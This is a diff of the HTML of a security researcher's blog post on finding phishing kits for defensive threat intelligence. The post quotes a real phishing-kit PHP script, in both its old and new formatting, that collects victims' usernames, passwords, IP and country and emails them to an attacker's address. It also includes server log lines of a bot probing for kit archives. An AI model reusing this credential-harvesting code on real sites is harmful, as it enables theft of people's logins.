@@ -44,7 +44,7 @@
       
       
     
-    <meta name="generator" content="Hugo 0.27-DEV" />
+    <meta name="generator" content="Hugo 0.40.3" />
 
     <link rel="canonical" href="https://jordan-wright.com/blog/2014/07/30/how-to-hunt-down-phishing-kits/" />
 
@@ -162,38 +162,36 @@
 <h3 id="how-phishing-kits-work">How Phishing Kits Work</h3>
 
 <p>To perform a phishing attack, attackers commonly employ prebuilt <em>phishing kits</em>. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#289870">&lt;?php</span>
+session_start<span style="color:#888">();</span>
+<span style="color:#2838b0">if</span><span style="color:#888">(</span><span style="color:#666">!</span>isset<span style="color:#888">(</span><span style="color:#b04040">$_SESSION</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">])</span> <span style="color:#666">||</span> <span style="color:#b04040">$_SESSION</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">]</span> <span style="color:#666">==</span> <span style="color:#b83838">&#34;&#34;</span> <span style="color:#666">||</span> <span style="color:#666">!</span>isset<span style="color:#888">(</span><span style="color:#b04040">$_SESSION</span><span style="color:#888">[</span><span style="color:#b83838">&#39;password&#39;</span><span style="color:#888">])</span> <span style="color:#666">||</span> <span style="color:#b04040">$_SESSION</span><span style="color:#888">[</span><span style="color:#b83838">&#39;password&#39;</span><span style="color:#888">]</span> <span style="color:#666">==</span> <span style="color:#b83838">&#34;&#34;</span><span style="color:#888">){</span>
+        header<span style="color:#888">(</span><span style="color:#b83838">&#34;Location:file_doc.php&#34;</span><span style="color:#888">);</span>
+        <span style="color:#2838b0">exit</span><span style="color:#888">;</span>
+<span style="color:#888">}</span>
+session_destroy<span style="color:#888">();</span>
+<span style="color:#b04040">$username</span> <span style="color:#666">=</span> <span style="color:#b04040">$_SESSION</span><span style="color:#888">[</span><span style="color:#b83838">&#39;username&#39;</span><span style="color:#888">];</span>
+<span style="color:#b04040">$password</span> <span style="color:#666">=</span> <span style="color:#b04040">$_SESSION</span><span style="color:#888">[</span><span style="color:#b83838">&#39;password&#39;</span><span style="color:#888">];</span>
 
-<pre><code class="language-php">&lt;?php
-session_start();
-if(!isset($_SESSION['username']) || $_SESSION['username'] == &quot;&quot; || !isset($_SESSION['password']) || $_SESSION['password'] == &quot;&quot;){
-        header(&quot;Location:file_doc.php&quot;);
-        exit;
-}
-session_destroy();
-$username = $_SESSION['username'];
-$password = $_SESSION['password'];
+<span style="color:#b04040">$ip</span> <span style="color:#666">=</span> getenv<span style="color:#888">(</span><span style="color:#b83838">&#34;REMOTE_ADDR&#34;</span><span style="color:#888">);</span>
+<span style="color:#b04040">$country</span> <span style="color:#666">=</span> visitor_country<span style="color:#888">();</span>
+<span style="color:#b04040">$message</span> <span style="color:#666">.=</span> <span style="color:#b83838">&#34;-------Moded by Ghost Wir3 ----------</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$message</span> <span style="color:#666">.=</span> <span style="color:#b83838">&#34;Username: &#34;</span><span style="color:#666">.</span><span style="color:#b04040">$username</span><span style="color:#666">.</span><span style="color:#b83838">&#34;</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$message</span> <span style="color:#666">.=</span> <span style="color:#b83838">&#34;Password : &#34;</span><span style="color:#666">.</span><span style="color:#b04040">$password</span><span style="color:#666">.</span><span style="color:#b83838">&#34;</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$message</span> <span style="color:#666">.=</span> <span style="color:#b83838">&#34;IP: &#34;</span><span style="color:#666">.</span><span style="color:#b04040">$ip</span><span style="color:#666">.</span><span style="color:#b83838">&#34;</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$message</span> <span style="color:#666">.=</span> <span style="color:#b83838">&#34;Country: &#34;</span><span style="color:#666">.</span><span style="color:#b04040">$country</span><span style="color:#666">.</span><span style="color:#b83838">&#34;</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$recipient</span> <span style="color:#666">=</span> <span style="color:#b83838">&#34;[redacted]@gmail.com&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$subject</span> <span style="color:#666">=</span> <span style="color:#b83838">&#34;Ghost Wir3 - &#34;</span><span style="color:#666">.</span><span style="color:#b04040">$country</span><span style="color:#888">;</span>
+<span style="color:#b04040">$headers</span> <span style="color:#666">=</span> <span style="color:#b83838">&#34;From:  Ghost Wir3 &lt;no_reply@mail.com&gt;&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$headers</span> <span style="color:#666">.=</span> <span style="color:#b04040">$_POST</span><span style="color:#888">[</span><span style="color:#b83838">&#39;eMailAdd&#39;</span><span style="color:#888">]</span><span style="color:#666">.</span><span style="color:#b83838">&#34;</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
+<span style="color:#b04040">$headers</span> <span style="color:#666">.=</span> <span style="color:#b83838">&#34;MIME-Version: 1.0</span><span style="color:#709030">\n</span><span style="color:#b83838">&#34;</span><span style="color:#888">;</span>
 
-$ip = getenv(&quot;REMOTE_ADDR&quot;);
-$country = visitor_country();
-$message .= &quot;-------Moded by Ghost Wir3 ----------\n&quot;;
-$message .= &quot;Username: &quot;.$username.&quot;\n&quot;;
-$message .= &quot;Password : &quot;.$password.&quot;\n&quot;;
-$message .= &quot;IP: &quot;.$ip.&quot;\n&quot;;
-$message .= &quot;Country: &quot;.$country.&quot;\n&quot;;
-$recipient = &quot;[redacted]@gmail.com&quot;;
-$subject = &quot;Ghost Wir3 - &quot;.$country;
-$headers = &quot;From:  Ghost Wir3 &lt;no_reply@mail.com&gt;&quot;;
-$headers .= $_POST['eMailAdd'].&quot;\n&quot;;
-$headers .= &quot;MIME-Version: 1.0\n&quot;;
-
-$arr = country_sort();
-foreach ($arr as $recipient)
-{
-        mail($recipient,$subject,$message,$headers);
-}
-?&gt;
-</code></pre>
-
+<span style="color:#b04040">$arr</span> <span style="color:#666">=</span> country_sort<span style="color:#888">();</span>
+<span style="color:#2838b0">foreach</span> <span style="color:#888">(</span><span style="color:#b04040">$arr</span> <span style="color:#2838b0">as</span> <span style="color:#b04040">$recipient</span><span style="color:#888">)</span>
+<span style="color:#888">{</span>
+        mail<span style="color:#888">(</span><span style="color:#b04040">$recipient</span><span style="color:#888">,</span><span style="color:#b04040">$subject</span><span style="color:#888">,</span><span style="color:#b04040">$message</span><span style="color:#888">,</span><span style="color:#b04040">$headers</span><span style="color:#888">);</span>
+<span style="color:#888">}</span>
+<span style="color:#289870">?&gt;</span>
+</code></pre></div>
 <p>In this example, to reuse the phishing kit, an attacker simply needs to change the <code>$recipient</code> variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).</p>
 
 <h3 id="how-to-find-phishing-kits">How to Find Phishing Kits</h3>
@@ -227,23 +225,20 @@ foreach ($arr as $recipient)
 <h3 id="fellow-phish-hunters">Fellow Phish Hunters</h3>
 
 <p>In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:</p>
-
-<pre><code class="language-text">[29/Jul/2014:02:59:44 +0100] &quot;GET /phpmyadmin/tardis.zip HTTP/1.1&quot; 404 428 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:44 +0100] &quot;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&quot; 404 435 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&quot; 404 435 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&quot; 404 439 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&quot; 404 434 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&quot; 404 432 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/update.zip HTTP/1.1&quot; 404 435 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&quot; 404 431 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&quot; 404 434 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:45 +0100] &quot;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&quot; 404 434 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:46 +0100] &quot;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&quot; 404 439 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:46 +0100] &quot;GET /phpmyadmin/paypal/us.zip HTTP/1.1&quot; 404 431 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:47 +0100] &quot;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&quot; 404 443 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-[29/Jul/2014:02:59:47 +0100] &quot;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&quot; 404 446 &quot;-&quot; &quot;Java/1.7.0_45&quot;
-</code></pre>
-
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[29/Jul/2014:02:59:44 +0100] &#34;GET /phpmyadmin/tardis.zip HTTP/1.1&#34; 404 428 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:44 +0100] &#34;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&#34; 404 439 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&#34; 404 434 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&#34; 404 432 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/update.zip HTTP/1.1&#34; 404 435 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&#34; 404 431 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&#34; 404 434 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:45 +0100] &#34;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&#34; 404 434 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:46 +0100] &#34;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&#34; 404 439 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:46 +0100] &#34;GET /phpmyadmin/paypal/us.zip HTTP/1.1&#34; 404 431 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:47 +0100] &#34;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&#34; 404 443 &#34;-&#34; &#34;Java/1.7.0_45&#34;
+[29/Jul/2014:02:59:47 +0100] &#34;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&#34; 404 446 &#34;-&#34; &#34;Java/1.7.0_45&#34;</code></pre></div>
 <p>We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a <strong>substantial</strong> number of requests for common files to be found on phishing kits. I&rsquo;ll likely parse these out and make another blog post with the full list for those interested.</p>
 
 <h3 id="conclusion">Conclusion</h3>
@@ -259,7 +254,7 @@ foreach ($arr as $recipient)
 
     
     <figure class="author-image">
-        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-wright-2-crop.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
+        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-profile.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
     </figure>
     
 
@@ -272,7 +267,7 @@ foreach ($arr as $recipient)
 <section class="author">
   <h4><a href="https://jordan-wright.com/blog/">Jordan Wright</a></h4>
   
-  <p>Security Researcher, Programmer, Time&#39;s 2006 Person of the Year</p>
+  <p>Security Researcher, Programmer.</p>
   
   <div class="author-meta">
     <span class="author-location icon-location">San Antonio, Texas</span>
